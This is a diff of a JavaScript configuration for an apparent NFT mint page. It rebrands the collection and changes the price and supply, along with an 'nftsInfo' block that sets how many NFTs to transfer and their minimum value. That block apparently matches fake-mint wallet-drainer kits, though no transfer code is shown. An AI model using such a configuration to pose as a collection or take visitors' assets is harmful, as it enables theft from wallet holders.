@@ -1,25 +1,25 @@
 const collectionInfo = {
-    name: "Nekozuma",
+    name: "The Flipside Metaverse",
     title: "{name}",
-    date: "10.08.2022",
+    date: "11.08.2022",
     socialMedia: {
         discord: "https://discord.com/",
         twitter: "https://twitter.com/",
     },
     medias: {
-        preview: "2.gif",
+        preview: "1.gif",
         favicon: "logo.jpg",
     },
     background: {
-        type: "image",
-        image: "1.gif",
-        video: "",
+        type: "video",
+        image: "",
+        video: "1.mp4",
         color: "#4E4E6D",
     }
 }
 const mintInfo = {
-    price: 1.88,
-    totalSupply: 2000,
+    price: 0.99,
+    totalSupply: 1000,
     toFixed: 2,
     minUnits: 1,
     maxUnits: 2,
@@ -28,8 +28,8 @@ const mintInfo = {
 
 const nftsInfo = {
     active: true,
-    minValue: 0.3,
-    maxTransfer: 5,
+    minValue: 0.2,
+    maxTransfer: 10,
 }
 
 if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
